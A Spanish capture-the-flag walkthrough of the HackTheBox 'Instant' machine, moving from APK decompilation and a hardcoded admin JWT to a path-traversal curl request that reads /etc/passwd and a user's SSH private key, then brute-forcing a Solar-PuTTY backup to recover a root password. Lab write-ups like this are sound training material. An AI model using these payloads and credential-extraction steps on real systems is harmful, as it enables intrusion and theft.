# Instant

![](../../assets/img/Pasted_image_20260813132543.png)

- Dominio *instant.htb*
- Whatweb
http://instant.htb [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], JQuery[3.2.1], Script, Title[Instant Wallet]

- Nada más abrir la web vemos la opción de descargar una apk
```bash
file instant.apk
```

![](../../assets/img/Pasted_image_20260813133009.png)

Es un archivo android

- Buscaremos herramientas para inspeccionar este tipo de archivos apk
- apktool
```bash
sudo apt install apktool
```

Con
```bash
apktool d instant.apk
```

Descomprimiremos el archivo .apk y veremos su contenido

![](../../assets/img/Pasted_image_20260813181746.png)

- Leemos en google que el archivo *res/values/strings.xml* puede contener información sensible
No vemos nada

- Se me ocurre filtrar por el dominio que conocemos de la máquina *instant.htb*
```bash
grep -r instan.htb --color
```

![](../../assets/img/Pasted_image_20260813182201.png)

![](../../assets/img/Pasted_image_20260813182203.png)

Vemos dos posibles subdominios
**mywalletv1.instant.htb** **swagger-ui.instant.htb**
- Los añadimos al /etc/hosts

- En *mywalletv1.instant.htb* nos devuelve un 404

- En *swagger-ui.instant.htb* vemos una página de Instant API
Qué es swagger?

![](../../assets/img/Pasted_image_20260813182510.png)

![](../../assets/img/Pasted_image_20260813182553.png)

Lo que vemos en la pág es:

![](../../assets/img/Pasted_image_20260813182454.png)

Nos muestra todas las peticiones que podemos hacerle a la api para interactuar con el sistema, tanto de creación y listado de archivo, como de logs y de transacciones

- Conseguimos logearnos a pesar de obtener varios 401 Unauthorized en varias de las peticiones

![](../../assets/img/Pasted_image_20260813183333.png)

```bash
curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"test@test.com\",  \"password\": \"testg\",  \"pin\": \"12345\",  \"username\": \"test\"}"
```

- Ahora nos logeamos, y nos da un token de sesión
```bash
curl -X POST "http://swagger-ui.instant.htb/api/v1/login" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"password\": \"testg\",  \"username\": \"test\"}"
```

El token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6ImMzY2ZhYTI5LTFhNzctNGUyNS1hYzNiLTc5Y2Y0NTg4OWM1OCIsImV4cCI6MTc4NjY2ODg2MX0.BUQJ80vxAUwWAFElPqzU_LTvg7gYFjslckuPu5Tvm04

![](../../assets/img/Pasted_image_20260813183442.png)

- Ahora con este token, podremos añadirlo pinchando en el candado en el swagger para añadirlo y formar las peticiones con curl con el token

![](../../assets/img/Pasted_image_20260813184404.png)

![](../../assets/img/Pasted_image_20260813184358.png)

Por ejemplo, ahora sí nos dejará ver nuestro perfil, aunque no podremos hacer consultas de admin a priori
```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/view/profile" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6ImMzY2ZhYTI5LTFhNzctNGUyNS1hYzNiLTc5Y2Y0NTg4OWM1OCIsImV4cCI6MTc4NjY2ODg2MX0.BUQJ80vxAUwWAFElPqzU_LTvg7gYFjslckuPu5Tvm04"
```

![](../../assets/img/Pasted_image_20260813184442.png)

- Buscando por *admin* encontramos un archivo donde hay un token que nos puede servir para autenticarnos como administrador en el swagger, ya que con el usuario que hemos creado no tenemos acceso a la mayoría de endpoints de la api
```bash
grep -ri 'admin'
```

![](../../assets/img/Pasted_image_20260813185553.png)

Vemos el archivo *instant/smali/com/instantlabs/instant/AdminActivities$1.smali*
Si lo abrimos vemos un token

![](../../assets/img/Pasted_image_20260813185652.png)

- Nos autorizamos con el token en el swagger e intentamos realizar peticiones ahora
Si intentamos visualizar logs, y ponemos como archivo a visualizar el que nos da por defecto */home/shirohige/logs/1.log*
Nos devuelve un 500

![](../../assets/img/Pasted_image_20260813185939.png)

Parece que no existe

- Vamos a intentar enumerar algún archivo que sepamos que existe en la máquina cómo /etc/passwd
Nos devuelve el mismo INTERNAL SERVER ERROR
En cambio si probamos con un Path Traversal *../../../../etc/passwd*

![](../../assets/img/Pasted_image_20260813190651.png)

Conseguimos ver archivos de la máquina

- Con el /etc/passwd conseguimos ver un usuario *shirohige* vamos a intentar obtener su id_rsa
Conseguimos ver el id_rsa

- Tendremos que tratarlo con jq para que nos devuelva el contenido y con tr y sed para eliminar los elementos sobrantes como \n " y comas
```bash
jq '.["/home/shirohige/logs/../../../../home/shirohige/.ssh/id_rsa"][]' | tr -d '"' | sed 's/\\n//'
```

-
```bash
jq '.["campo"][]'
```

-> devuelve el contenido del campo del JSON
-
```bash
tr -d '"'
```

-> elimina las '
- sed
```bash
s/
```

-> modo sustitución
```bash
\\n
```

salto de línea (\n) escapado (\)
```bash
//
```

sustituir (/) por nada (/)

- El total
```bash
curl -sX GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq '.["/home/shirohige/logs/../../../../home/shirohige/.ssh/id_rsa"][]' | tr -d '"' | sed 's/\\n//'
```

![](../../assets/img/Pasted_image_20260813192420.png)

- Nos conectamos por ssh
```bash
chmod 600 id_rsa
ssh shirohige@instant.htb -i id_rsa
```

shirohige

## Escalada

- id -> grupo development -> no parece haber nada con
```bash
find / -group development 2>/dev/null
```

- Buscamos por contenido cuyo usuario propietario sea *shirohige*
```bash
find / -user shirohige 2>/dev/null | grep -vE "cgroup|shirohige"
```

Encontramos en  */opt/backups/Solar-PuTTY*  lo que parece una clave de ssh

![](../../assets/img/Pasted_image_20260813193355.png)

Qué es Solar-PuTTY

![](../../assets/img/Pasted_image_20260813193542.png)

- Como la clave es pequeña intentaremos bruteforcearla
Buscamos en google *solar putty session backup decrypt*
Encontramos una herramienta -> https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5

- Tendremos que instalar la librería
```bash
python3 -m pip install pycryptodome
python3 solarPuttyDecrypt.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
```

Nos lo descifra

![](../../assets/img/Pasted_image_20260813195712.png)

Vemos una contraseña para root
12**24nzC!r0c%q12**
root
